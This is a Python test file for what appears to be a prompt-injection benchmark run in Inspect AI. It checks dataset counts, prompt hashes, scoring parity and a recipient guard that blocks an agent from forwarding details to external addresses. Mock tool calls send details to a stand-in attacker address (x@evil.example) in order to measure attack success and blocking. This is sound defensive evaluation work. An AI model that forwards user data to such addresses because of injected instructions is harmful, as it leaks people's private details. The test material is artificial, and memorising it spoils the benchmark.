"""Offline parity and real Inspect execution tests; no API credentials required."""
import hashlib
import json
import math
import tempfile
import unittest
import importlib.util
from collections import Counter
from unittest.mock import patch

if importlib.util.find_spec("inspect_ai") is None:
    raise unittest.SkipTest("Install the Inspect extra: uv sync --extra inspect")

from inspect_ai import eval
from inspect_ai.model import ChatCompletionChoice, ChatMessageAssistant, ModelOutput, get_model
from inspect_ai.tool import ToolCall

from agent import PROMPT_VARIANTS, build_user_message
from documents import build_dataset
from model import AgentOutcome, forwarding_decision
from run import run_experiment
from inspect_eval.task import aggregate, samples, score_outcome, transfer


def output(calls):
    return ModelOutput(model="mockllm/model", choices=[ChatCompletionChoice(
        message=ChatMessageAssistant(content="", tool_calls=calls), stop_reason="tool_calls")])


class TransferTests(unittest.TestCase):
    def test_frozen_dataset_and_prompt(self):
        cases = build_dataset("heldout-v1", 0)
        data = samples(repetitions=3)
        self.assertEqual(len(data), 468)
        self.assertEqual(len({s.id for s in data}), 468)
        self.assertEqual(Counter(s.metadata["control_type"] for s in data),
                         {"attack": 360, "benign": 36, "legitimate_forward": 72})
        for sample, case in zip(data, cases * 3):
            self.assertEqual(sample.input, build_user_message(case["document"]))
            self.assertEqual(sample.target, case["expected_recipient"])
        for variant, (_, prompt) in PROMPT_VARIANTS.items():
            t = transfer(prompt=variant)
            self.assertEqual(t.metadata["system_prompt_sha256"],
                             hashlib.sha256(prompt.encode()).hexdigest())
            self.assertEqual(t.metadata["dataset_sha256"],
                             hashlib.sha256(json.dumps(cases, sort_keys=True).encode()).hexdigest())
        with self.assertRaises(ValueError):
            transfer(repetitions=0)

    def test_parity_against_original_runner(self):
        # Identical outcomes are replayed through the unchanged original runner
        # and adapter, including invalid calls, missing actions and observed harm.
        calls_list = [[], [{"name": "no_action", "args": {}}],
                      [{"name": "escalate_ticket", "args": {"reason": "review"}}]]
        for recipient in ("billing@support.internal", "x@evil.example", "malformed",
                          "x@support.internal.evil.example", "Name <x@internal>", ""):
            calls_list.append([{"name": "forward_details", "args": {"recipient": recipient}}])
        calls_list.append(calls_list[3] + calls_list[4])
        cases = build_dataset("heldout-v1", 0)
        for enforce in (False, True):
            for calls in calls_list:
                for invalid in ([], [{"name": "broken", "error": "invalid JSON"}]):
                    events = [forwarding_decision(c["args"]["recipient"], enforce)
                              for c in calls if c["name"] == "forward_details"]
                    outcome = AgentOutcome(calls, "", invalid, forwarding_events=events)
                    with patch("run.get_runner", return_value=lambda _: outcome):
                        rows = run_experiment(False, "replay", "heldout-v1", repetitions=1,
                                              enforce_recipients=enforce)
                    for case, row in zip(cases, rows):
                        actual = score_outcome(case, calls, events, invalid)
                        for key, value in actual.items():
                            self.assertEqual(value, row[key], (key, case["id"], calls))
        with patch("run.get_runner", return_value=lambda _: (_ for _ in ()).throw(RuntimeError("offline"))):
            rows = run_experiment(False, "replay", "heldout-v1", repetitions=1)
        for case, row in zip(cases, rows):
            for key, value in score_outcome(case, [], [], error="RuntimeError: offline").items():
                self.assertEqual(value, row[key])

    def run_inspect(self, calls, enforce=False):
        seen = []
        def respond(messages, tools, tool_choice, config):
            seen.append(messages)
            self.assertEqual(tool_choice, "any")
            self.assertFalse(config.parallel_tool_calls)
            self.assertEqual(messages[0].content, PROMPT_VARIANTS["defense"][1])
            return output(calls)
        with tempfile.TemporaryDirectory() as directory:
            logs = eval(transfer(prompt="defense", enforce_recipients=enforce,
                                 repetitions=1, smoke_test=True),
                        model=get_model("mockllm/model", custom_outputs=respond),
                        log_dir=directory, display="none", max_samples=1)
            self.assertEqual(logs[0].status, "success", logs[0].error)
            self.assertEqual(len(seen), 3)  # Exactly ONE decision per sample.
            self.assertEqual(len(logs[0].samples), 3)
            return [next(iter(s.scores.values())).metadata for s in logs[0].samples]

    def test_real_inspect_tool_execution(self):
        calls = [ToolCall(id="f", function="forward_details", arguments={"recipient": "x@evil.example"})]
        for enforce in (False, True):
            for record in self.run_inspect(calls, enforce):
                self.assertTrue(record["outcome"]["attempted_external_forward"])
                self.assertEqual(record["outcome"]["executed_external_forward"], not enforce)
                self.assertEqual(record["outcome"]["blocked_forward_count"], int(enforce))
                self.assertFalse(record["outcome"]["invalid_trial"])

    def test_missing_and_unparseable_actions(self):
        for calls in ([], [ToolCall(id="bad", function="forward_details", arguments={},
                                   parse_error="invalid JSON")]):
            for record in self.run_inspect(calls):
                self.assertTrue(record["outcome"]["invalid_trial"])
                self.assertFalse(record["outcome"]["false_refusal"])
                self.assertFalse(record["outcome"]["executed_external_forward"])

    def test_zero_denominators_are_not_zero_rates(self):
        row = score_outcome(build_dataset("heldout-v1")[0], [], [])
        summary = aggregate([row])
        self.assertTrue(math.isnan(summary["attempted_asr"]))
        self.assertTrue(math.isnan(summary["false_refusal_rate"]))

    def test_guard_permits_internal_and_records_all_calls(self):
        calls = [ToolCall(id="internal", function="forward_details",
                          arguments={"recipient": "billing@support.internal"}),
                 ToolCall(id="external", function="forward_details",
                          arguments={"recipient": "x@evil.example"})]
        for record in self.run_inspect(calls, enforce=True):
            self.assertEqual(len(record["forwarding_events"]), 2)
            self.assertEqual(sum(e["allowed"] for e in record["forwarding_events"]), 1)
            self.assertTrue(record["outcome"]["attempted_external_forward"])
            self.assertFalse(record["outcome"]["executed_external_forward"])

    def test_non_string_recipient_is_auditable_not_a_scorer_crash(self):
        for record in self.run_inspect([ToolCall(id="bad", function="forward_details",
                                                 arguments={"recipient": ["x@evil.example"]})]):
            self.assertTrue(record["outcome"]["invalid_trial"])
            self.assertTrue(record["tool_errors"])
            self.assertEqual(record["forwarding_events"], [])

    def test_invalid_trials_excluded_but_observed_execution_retained(self):
        case = next(c for c in build_dataset("heldout-v1") if c["is_attack"])
        calls = [{"name": "forward_details", "args": {"recipient": "x@evil.example"}}]
        event = forwarding_decision("x@evil.example", False)
        row = score_outcome(case, calls, [event], invalid_calls=[{"error": "bad JSON"}])
        metrics = aggregate([row])
        self.assertEqual(metrics["valid_attacks"], 0)
        self.assertEqual(metrics["attack_trials"], 1)
        self.assertEqual(metrics["invalid_trials"], 1)
        self.assertEqual(metrics["allowed_external_forwards"], 1)
        self.assertEqual(metrics["observed_unsafe_requests"], 1)


if __name__ == "__main__":
    unittest.main()
